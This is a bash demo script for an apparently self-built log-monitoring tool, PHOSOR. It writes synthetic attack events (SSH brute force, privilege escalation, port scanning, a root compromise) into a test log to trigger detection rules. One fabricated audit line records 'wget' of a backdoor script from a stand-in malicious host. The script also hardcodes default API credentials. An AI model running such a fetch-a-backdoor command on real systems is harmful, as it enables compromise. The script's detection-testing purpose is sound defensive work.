#!/bin/bash

# PHOSOR Demo Script
# Demonstrates all features with realistic security scenarios

set -e

API_URL="http://localhost:8000/api"
TOKEN=""

echo "================================"
echo "PHOSOR Feature Demo"
echo "================================"
echo ""
echo "This script will:"
echo "1. Authenticate with the API"
echo "2. Create test log sources"
echo "3. Generate realistic security events"
echo "4. Trigger correlation rules"
echo "5. Show real-time alerts"
echo ""
read -p "Press Enter to continue..."

# Function to wait
wait_seconds() {
    echo "Waiting $1 seconds..."
    sleep $1
}

# Authenticate
echo ""
echo "[1] Authenticating..."
TOKEN=$(curl -s -X POST "$API_URL/auth/token" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=admin&password=secret" | grep -o '"access_token":"[^"]*' | cut -d'"' -f4)

if [ -z "$TOKEN" ]; then
    echo "ERROR: Failed to authenticate. Is the backend running?"
    exit 1
fi

echo "✓ Authenticated successfully"

# Create test log file
echo ""
echo "[2] Creating test log file..."
mkdir -p /tmp/phosor-logs
TEST_LOG="/tmp/phosor-logs/security.log"
> $TEST_LOG  # Clear file
echo "✓ Created $TEST_LOG"

# Add file source
echo ""
echo "[3] Adding log file to PHOSOR..."
curl -s -X POST "$API_URL/sources/file/add" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"filepath\": \"$TEST_LOG\"}" > /dev/null
echo "✓ File source added"

wait_seconds 2

# Scenario 1: Brute Force Attack
echo ""
echo "================================"
echo "SCENARIO 1: SSH Brute Force Attack"
echo "================================"
echo "Simulating failed login attempts from 203.0.113.42..."
echo ""

for i in {1..6}; do
    echo "$(date -Iseconds) sshd[1234]: Failed password for admin from 203.0.113.42 port 22 ssh2" >> $TEST_LOG
    echo "  Attempt $i/6"
    sleep 1
done

echo ""
echo "✓ Brute force pattern should trigger 'Brute Force Detection' rule"
echo "  Check dashboard for CRITICAL alert!"

wait_seconds 3

# Scenario 2: Privilege Escalation
echo ""
echo "================================"
echo "SCENARIO 2: Suspicious Privilege Escalation"
echo "================================"
echo "User gains root access after failed login..."
echo ""

echo "$(date -Iseconds) sshd[1235]: Failed password for hacker from 198.51.100.23" >> $TEST_LOG
echo "  Failed login attempt"
sleep 2

echo "$(date -Iseconds) sudo[1236]: hacker : TTY=pts/0 ; PWD=/home/hacker ; USER=root ; COMMAND=/bin/bash" >> $TEST_LOG
echo "  Root access gained!"
sleep 2

echo ""
echo "✓ This should trigger correlation rule if configured"

wait_seconds 3

# Scenario 3: System Errors
echo ""
echo "================================"
echo "SCENARIO 3: Critical System Errors"
echo "================================"
echo ""

echo "$(date -Iseconds) kernel: Out of memory: Kill process 9999 (apache2)" >> $TEST_LOG
echo "  Critical memory error"
sleep 1

echo "$(date -Iseconds) systemd[1]: Failed to start PostgreSQL Database." >> $TEST_LOG
echo "  Database failure"
sleep 1

echo "$(date -Iseconds) CRON[5555]: (root) CMD (/usr/bin/backup.sh) FAILED" >> $TEST_LOG
echo "  Backup failure"
sleep 1

echo ""
echo "✓ Multiple critical system errors generated"

wait_seconds 2

# Scenario 4: Network Anomaly
echo ""
echo "================================"
echo "SCENARIO 4: Network Scanning Activity"
echo "================================"
echo "Suspicious port scanning detected..."
echo ""

for port in 22 80 443 3306 5432 27017 6379; do
    echo "$(date -Iseconds) firewall: DENY IN=eth0 OUT= SRC=192.0.2.100 DST=192.168.1.10 PROTO=TCP DPT=$port" >> $TEST_LOG
    echo "  Scan on port $port"
    sleep 0.5
done

echo ""
echo "✓ Port scan pattern logged"

wait_seconds 2

# Scenario 5: Successful Attack
echo ""
echo "================================"
echo "SCENARIO 5: Successful Compromise"
echo "================================"
echo "Attacker succeeds after multiple attempts..."
echo ""

for i in {1..3}; do
    echo "$(date -Iseconds) sshd[2000]: Failed password for root from 203.0.113.100" >> $TEST_LOG
    sleep 0.5
done

echo "$(date -Iseconds) sshd[2001]: Accepted password for root from 203.0.113.100" >> $TEST_LOG
echo "  ⚠ ROOT LOGIN SUCCESSFUL!"
sleep 1

echo "$(date -Iseconds) audit[2002]: USER_CMD user=root cmd=/usr/bin/whoami" >> $TEST_LOG
echo "$(date -Iseconds) audit[2003]: USER_CMD user=root cmd=/usr/bin/wget http://malicious.com/backdoor.sh" >> $TEST_LOG
echo "  Suspicious commands executed"

echo ""
echo "✓ Complete attack chain logged"

wait_seconds 2

# Show statistics
echo ""
echo "================================"
echo "System Statistics"
echo "================================"
echo ""

STATS=$(curl -s -X GET "$API_URL/stats" \
    -H "Authorization: Bearer $TOKEN")

echo "$STATS" | python3 -c "
import sys, json
stats = json.load(sys.stdin)
print(f\"Total Events:    {stats['total_events']}\")
print(f\"Total Alerts:    {stats['total_alerts']}\")
print(f\"Active Rules:    {stats['active_rules']}\")
print(f\"Active Sources:  {stats['active_sources']}\")
print(f\"Uptime:          {stats['uptime_seconds']:.0f}s\")
"

echo ""
echo "================================"
echo "Demo Complete!"
echo "================================"
echo ""
echo "Next Steps:"
echo "1. Open dashboard at http://localhost:3000"
echo "2. Check the Alerts tab for triggered rules"
echo "3. View alert details and matched events"
echo "4. Acknowledge critical alerts"
echo "5. Explore Sources and Rules tabs"
echo ""
echo "Test log file: $TEST_LOG"
echo ""
echo "To generate continuous events:"
echo "  ./test-events.sh"
echo ""
